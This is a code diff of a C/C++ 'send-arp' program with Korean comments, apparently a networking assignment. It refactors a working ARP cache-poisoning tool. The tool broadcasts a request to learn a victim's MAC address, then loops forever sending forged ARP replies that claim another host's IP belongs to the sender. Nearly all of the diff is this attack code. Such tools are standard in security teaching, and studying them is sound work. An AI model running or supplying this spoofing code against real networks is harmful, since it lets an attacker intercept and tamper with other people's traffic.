@@ -11,54 +11,28 @@
 #include <net/if.h>
 #include <unistd.h>
 
-bool getMyMacAddress(const char* interface, char* mac_str);
-bool getMyIpAddress(const char* interface, char* ip_str);
+typedef struct ARP_INFECTION_PACKET {
+	ETHERNET_HDR eth_h;
+	ARP_HDR arp_h;
+} __attribute__((packed)) ARP_PACKET;	/* wireshark로 확인 후 00 00 있는거 확인 후 구조체패딩 해제 */
 
 void usage() {
 	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
 	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1");
 }
 
-typedef struct ARP_INFECTION_PACKET {
-	ETHERNET_HDR eth_h;
-	ARP_HDR arp_h;
-} __attribute__((packed)) ARP_PACKET;	/* wireshark로 확인 후 00 00 있는거 확인 후 구조체패딩 해제 */
-
-void receive_arp(int c, char* sender_ip){
-	ARP_PACKET *packet = new ARP_PACKET;
-}
-
-ARP_PACKET send_arp_preparing(
+void send_arp_preparing(
+    ARP_PACKET* packet,
 	char* src_mac, char* dst_mac,
 	uint8_t oper,
-	char* sender_ip, char* target_ip,
-	char* sender_mac, char* target_mac
-){
-	ARP_PACKET packet;
+	const char* sender_ip, const char* target_ip,
+	const char* sender_mac, const char* target_mac
+);
 
-	stringmac_to_bytemac(src_mac, packet.eth_h.ether_shost); // Source MAC address
-	stringmac_to_bytemac(dst_mac, packet.eth_h.ether_dhost); // Destination MAC address
+void receive_arp(int c, const char* sender_ip);
 
-	printf("Source MAC: %s, Destination MAC: %s\n", src_mac, dst_mac);
-
-	packet.eth_h.ether_type = htons(0x0806); 	// ARP protocol
-
-	packet.arp_h.hardware_type = htons(0x0001); // Ethernet
-	packet.arp_h.protocol_type = htons(0x0800); // IPv4
-	packet.arp_h.hardware_length = 0x06; 		// MAC address length
-	packet.arp_h.protocol_length = 0x04; 		// IPv4 address length
-	packet.arp_h.operation = htons(oper); 		// ARP reply
-
-	stringip_to_byteip(sender_ip, &packet.arp_h.sender_ip_address); 	// Sender IP address
-	stringip_to_byteip(target_ip, &packet.arp_h.target_ip_address); 	// Target IP
-	stringmac_to_bytemac(sender_mac, packet.arp_h.sender_mac_address); 	// Sender MAC address
-	stringmac_to_bytemac(target_mac, packet.arp_h.target_mac_address); 	// Target MAC address
-
-	printf("Sender IP: %s, Target IP: %s\n", sender_ip, target_ip);
-	printf("Sender MAC: %s, Target MAC: %s\n", sender_mac, target_mac);
-
-	return packet;
-}
+bool getMyMacAddress(const char* interface, char* mac_str);
+bool getMyIpAddress(const char* interface, char* ip_str);
 
 int main(int argc, char* argv[]) {
 	if (argc < 4 || argc % 2 != 0) {
@@ -81,20 +55,24 @@ int main(int argc, char* argv[]) {
 
 	while (1){
 		for(int i = 2; i < argc; i += 2) {
+            printf("----------");
 			/* who has <target_ip>? 요청 */
-			printf("who has <target_ip>? 요청\n");
-			ARP_PACKET tip_req_packet = send_arp_preparing(
+			printf("\nwho has <target_ip>? 요청\n");
+			ARP_PACKET* tip_req_packet = new ARP_PACKET();
+            send_arp_preparing(
+                tip_req_packet,
 				my_mac, "ff:ff:ff:ff:ff:ff",
 				0x0001,
 				my_ip, argv[i],
-				my_mac, "00:00:00:00:00:00"); // ARP request operation
-			if (pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&tip_req_packet), sizeof(tip_req_packet)) != 0) {
+				my_mac, "00:00:00:00:00:00"
+            ); // ARP request operation
+			if (pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(tip_req_packet), sizeof(ARP_PACKET)) != 0) {
 				fprintf(stderr, "send packet error: %s\n", pcap_geterr(pcap));
 				return -1;
 			}
 
 			/* <target_ip> is <victim_mac> 응답 */
-			printf("<target_ip> is <victim_mac> 응답\n");
+			printf("\n<target_ip> is <victim_mac> 응답\n");
 			ARP_PACKET* tip_res_packet = NULL;
 			char sender_ip[16];
 			while(1) {
@@ -119,24 +97,62 @@ int main(int argc, char* argv[]) {
 			}
 
 			/* 위조 패킷 보내기 */
-			printf("Sending forged ARP packet to %s\n", argv[i]);
+			printf("\nSending forged ARP packet to %s\n", argv[i]);
 			char victim_mac[18];
 			bytemac_to_stringmac(tip_res_packet->arp_h.sender_mac_address, victim_mac);
 
-			ARP_PACKET packet = send_arp_preparing(
+			ARP_PACKET* infection_packet = new ARP_PACKET();
+            send_arp_preparing(
+                infection_packet,
 				my_mac, victim_mac,
 				0x0002,
 				argv[i+1], argv[i], /* sender IP, target IP: 공격 대상과 타겟의 IP를 사용 */
-				my_mac, victim_mac);
-			if (pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(packet)) != 0) {
+				my_mac, victim_mac
+            );
+			if (pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(infection_packet), sizeof(ARP_PACKET)) != 0) {
 				fprintf(stderr, "send packet error: %s\n", pcap_geterr(pcap));
 				return -1;
 			}
 			printf("Sent ARP packet from %s to %s\n\n\n", my_ip, argv[i + 1]);
 		}
-		sleep(1); // Wait for a second before sending the next ARP packets
+        printf("----------");
+
+		sleep(10); // Wait for a second before sending the next ARP packets
 	}
 	pcap_close(pcap);
+}
+
+void send_arp_preparing(
+    ARP_PACKET* packet,
+	char* src_mac, char* dst_mac,
+	uint8_t oper,
+	const char* sender_ip, const char* target_ip,
+	const char* sender_mac, const char* target_mac
+) {
+	stringmac_to_bytemac(src_mac, packet->eth_h.ether_shost); // Source MAC address
+	stringmac_to_bytemac(dst_mac, packet->eth_h.ether_dhost); // Destination MAC address
+
+	printf("Source MAC: %s, Destination MAC: %s\n", src_mac, dst_mac);
+
+	packet->eth_h.ether_type = htons(0x0806); 	// ARP protocol
+
+	packet->arp_h.hardware_type = htons(0x0001); // Ethernet
+	packet->arp_h.protocol_type = htons(0x0800); // IPv4
+	packet->arp_h.hardware_length = 0x06; 		// MAC address length
+	packet->arp_h.protocol_length = 0x04; 		// IPv4 address length
+	packet->arp_h.operation = htons(oper); 		// ARP reply
+
+	stringip_to_byteip(sender_ip, &packet->arp_h.sender_ip_address); 	// Sender IP address
+	stringip_to_byteip(target_ip, &packet->arp_h.target_ip_address); 	// Target IP
+	stringmac_to_bytemac(sender_mac, packet->arp_h.sender_mac_address); 	// Sender MAC address
+	stringmac_to_bytemac(target_mac, packet->arp_h.target_mac_address); 	// Target MAC address
+
+	printf("Sender IP: %s, Target IP: %s\n", sender_ip, target_ip);
+	printf("Sender MAC: %s, Target MAC: %s\n", sender_mac, target_mac);
+}
+
+void receive_arp(int c, char* sender_ip){
+	ARP_PACKET *packet = new ARP_PACKET;
 }
 
 bool getMyMacAddress(const char* interface, char* mac_str) {
